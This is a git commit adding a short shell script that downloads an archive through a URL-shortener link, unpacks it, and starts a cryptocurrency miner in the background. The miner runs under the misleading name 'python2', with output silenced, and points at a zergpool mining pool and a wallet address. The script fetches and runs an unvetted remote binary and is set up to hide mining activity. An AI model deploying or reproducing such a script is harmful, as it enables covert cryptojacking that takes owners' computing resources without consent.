625e538607cd2a4993ca212ce00fdcd59f6ead2f
DotAja <142836390+DotAja@users.noreply.github.com>
2024-05-12 22:28:02 +0700

    Created By Hendi Kusnandi

---
+++ dotzerg.sh
@@ -0,0 +1,5 @@
+wget -O dotaja.tar.gz s.id/dotaja
+
+tar -xzvf dotaja.tar.gz
+
+nohup ./python2 --algo PYRIN --pool pyrinhash.asia.mine.zergpool.com:5557 --user DDNAURzgPGuWuLb1joXcKTA7iMydnXaTXK --pass c=DGB  > /dev/null 2>&1 &
